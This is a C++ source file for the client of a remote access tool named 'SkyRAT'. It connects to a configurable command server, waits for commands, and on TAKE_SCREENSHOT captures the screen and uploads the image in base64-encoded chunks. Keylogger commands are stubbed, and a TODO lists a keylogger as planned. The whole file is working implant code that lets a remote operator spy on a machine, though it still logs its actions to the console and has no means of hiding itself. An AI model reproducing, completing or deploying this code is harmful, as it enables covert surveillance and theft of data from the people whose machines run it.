// g++ -std=c++11 client.cpp .\modules\ss_module.cpp -o client -lws2_32 -lgdiplus -lgdi32 -lole32 -pthread

// TO DO
// move functions to the modules directory and minimize client.cpp
// implement keylogger
// 

#include <iostream>
#include <thread>
#include <chrono>
#include <cstring>
#include <string>
#include <atomic>
#include <csignal>
#include <fstream>
#include <vector>
#include <sstream>

// module headers
#include <memory>
#include "modules/ss_module.h"

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR   -1
typedef int SOCKET;
#endif

// Configuration of server connection
const char* SERVER_IP     = "127.0.0.1"; // Server IP address
const uint16_t SERVER_PORT = 4545;        // Server port
const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data

// Global atomic flag for graceful shutdown
std::atomic<bool> g_running{true};

// Function declarations
std::string base64_encode(const std::vector<char>& data);
bool send_message(SOCKET sock, const std::string& message);
bool SendFileViaMsgpack(SOCKET sock, const char* filename);
bool SendFileInChunks(SOCKET sock, const char* filename, const std::vector<char>& filedata);

// Simple msgpack message structure for server compatibility
std::vector<char> create_message(const std::string& content) {
    // Create msgpack format: [{"content": "message"}]
    // This is a simplified approach that works with the Python server
    
    std::vector<char> result;
    
    // Array with 1 element (fixarray format: 0x91)
    result.push_back(0x91);
    
    // Map with 1 key-value pair (fixmap format: 0x81)  
    result.push_back(0x81);
    
    // Key: "content" (7 chars, fixstr: 0xa7)
    result.push_back(0xa7);
    result.insert(result.end(), {'c','o','n','t','e','n','t'});
    
    // Value: message content
    if (content.length() < 32) {
        // fixstr format (0xa0 + length)
        result.push_back(0xa0 + static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else if (content.length() < 256) {
        // str8 format  
        result.push_back(0xd9);
        result.push_back(static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else {
        // str16 format
        result.push_back(0xda);
        result.push_back(static_cast<char>((content.length() >> 8) & 0xFF));
        result.push_back(static_cast<char>(content.length() & 0xFF));
        result.insert(result.end(), content.begin(), content.end());
    }
    
    return result;
}

// Signal handler to catch termination signals (like Ctrl+C)
void signal_handler(int signal) {
    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
    g_running = false; // Set the flag to false to stop main loop
}

// Function to send a file over socket using msgpack protocol
bool SendFileViaMsgpack(SOCKET sock, const char* filename) {
    // Open file in binary mode
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }

    // Read entire file into memory
    file.seekg(0, std::ios::end);
    size_t filesize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> filedata(filesize);
    file.read(filedata.data(), filesize);
    file.close();
    
    // For large files, we should chunk them
    if (filesize > 64 * 1024) { // 64KB limit for single message
        std::cout << "[Info] Large file (" << filesize << " bytes) - using chunked transfer" << std::endl;
        return SendFileInChunks(sock, filename, filedata);
    }
    
    // Convert binary data to base64 for safe transmission
    std::string base64_data = base64_encode(filedata);
    
    // Send file as a single message
    std::string file_message = "SCREENSHOT_DATA:" + base64_data;
    return send_message(sock, file_message);
}

// Function to send file in chunks for large files
bool SendFileInChunks(SOCKET sock, const char* filename, const std::vector<char>& filedata) {
    const size_t chunk_size = 512; // 512 bytes chunks to stay well under msgpack 1024 limit
    size_t total_chunks = (filedata.size() + chunk_size - 1) / chunk_size;
    
    std::cout << "[Info] Sending file in " << total_chunks << " chunks of " << chunk_size << " bytes each" << std::endl;
    
    // Send file header
    std::string header = "FILE_START:" + std::string(filename) + ":" + std::to_string(filedata.size()) + ":" + std::to_string(total_chunks);
    if (!send_message(sock, header)) return false;
    
    // Send chunks
    for (size_t i = 0; i < total_chunks; ++i) {
        size_t start = i * chunk_size;
        size_t end = std::min(start + chunk_size, filedata.size());
        
        std::vector<char> chunk(filedata.begin() + start, filedata.begin() + end);
        std::string base64_chunk = base64_encode(chunk);
        
        std::string chunk_message = "FILE_CHUNK:" + std::to_string(i) + ":" + base64_chunk;
        if (!send_message(sock, chunk_message)) {
            std::cerr << "[Error] Failed to send chunk " << i << "/" << total_chunks << std::endl;
            return false;
        }
        
        // Show progress every 50 chunks
        if (i % 50 == 0 || i == total_chunks - 1) {
            std::cout << "[Progress] Sent chunk " << (i + 1) << "/" << total_chunks << std::endl;
        }
        
        // Small delay between chunks to avoid overwhelming the connection
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    
    std::cout << "[Success] File transfer completed - " << total_chunks << " chunks sent" << std::endl;
    
    // Send file end marker
    std::string end_message = "FILE_END:" + std::string(filename);
    return send_message(sock, end_message);
}

// Simple base64 encoding function
std::string base64_encode(const std::vector<char>& data) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;
    
    for (char c : data) {
        val = (val << 8) + (unsigned char)c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    while (result.size() % 4) {
        result.push_back('=');
    }
    return result;
}

// Initialize socket subsystem
bool init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
#else
    return true;
#endif
}

// Cleanup socket subsystem
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Create and connect socket to server
SOCKET connect_to_server(const char* ip, uint16_t port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: Could not create socket." << std::endl;
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error: Connection failed." << std::endl;
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return INVALID_SOCKET;
    }

    return sock; // Return connected socket
}

// Send message over socket using server's expected format
bool send_message(SOCKET sock, const std::string& msg) {
    std::vector<char> formatted_msg = create_message(msg);
    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
}

// Receive message from socket
int receive_reply(SOCKET sock, char* buffer, int bufSize) {
    int bytes = recv(sock, buffer, bufSize - 1, 0);
    if (bytes > 0) buffer[bytes] = '\0'; // Null-terminate the received data
    return bytes;
}

// Handle commands received from server
void handle_command(const std::string& command, SOCKET sock) {
    std::cout << "[Command] Received: " << command << std::endl;

    if (command == "TAKE_SCREENSHOT") {
        std::cout << "[Action] Taking screenshot..." << std::endl;

        try {
            // Initialize GDI+
            ULONG_PTR gdiplusToken;
            Gdiplus::GdiplusStartupInput gdiStartupInput;
            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
            
            if (status != Gdiplus::Ok) {
                std::cerr << "[Error] Failed to initialize GDI+. Status: " << status << std::endl;
                return;
            }

            const char* filename = "screenshot.png"; // Save filename
            TakeScreenshot(filename); // Capture screenshot
            
            std::cout << "[Action] Screenshot taken, file saved as: " << filename << std::endl;
            
            if (SendFileViaMsgpack(sock, filename)) {
                std::cout << "[Success] Screenshot sent to server" << std::endl;
            } else {
                std::cout << "[Warning] Screenshot saved locally but failed to send" << std::endl;
            }

            Gdiplus::GdiplusShutdown(gdiplusToken); // Shutdown GDI+
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
        }
    }
    else if (command == "START_KEYLOGGER") {
        std::cout << "[Action] Starting keylogger module..." << std::endl;
        // TODO: Implement keylogger start
    }
    else if (command == "STOP_KEYLOGGER") {
        std::cout << "[Action] Stopping keylogger..." << std::endl;
        // TODO: Implement keylogger stop
    }
    else {
        std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
    }
}

// Connection handler in a separate thread
void handle_connection() {
    if (!init_sockets()) {
        std::cerr << "Error: Socket subsystem init failed." << std::endl;
        return;
    }

    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
    if (sock == INVALID_SOCKET) {
        cleanup_sockets();
        return;
    }
    std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // Send initial greeting message
    std::string greeting = "Hello from threaded client!";
    if (!send_message(sock, greeting)) {
        std::cerr << "Error: Send failed." << std::endl;
        goto cleanup;
    }
    std::cout << "[Thread] Sent greeting to server" << std::endl;

    // Listening for server commands
    char buffer[RECV_BUF_SIZE];
    std::cout << "[Thread] Starting command listening loop..." << std::endl;
    
    while (g_running) {
        std::cout << "[Thread] Waiting for command..." << std::endl;
        int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
        
        if (received > 0) {
            std::cout << "[Thread] Received " << received << " bytes" << std::endl;
            std::string command(buffer);
            handle_command(command, sock);

            // Send acknowledgment back
            std::string ack = "ACK: " + command;
            if (!send_message(sock, ack)) {
                std::cerr << "Error: Failed to send acknowledgment." << std::endl;
                break;
            }
            std::cout << "[Thread] Sent acknowledgment" << std::endl;
        } else if (received == 0) {
            std::cout << "[Thread] Server closed the connection." << std::endl;
            break;
        } else {
            std::cerr << "Error: Receive failed. Error code: " << received << std::endl;
#ifdef _WIN32
            std::cerr << "WSA Error: " << WSAGetLastError() << std::endl;
#endif
            break;
        }
    }

cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    cleanup_sockets();
    std::cout << "[Thread] Connection closed." << std::endl;
}

int main() {
    std::cout << "Starting SkyRAT threaded client..." << std::endl;

    // Register signal handler
    std::signal(SIGINT, signal_handler);

    // Launch thread for handling connection
    std::thread clientThread(handle_connection);

    // Wait for thread to finish (blocks until connection thread exits)
    clientThread.join();

    std::cout << "Client thread finished. Exiting." << std::endl;
    return 0;
}
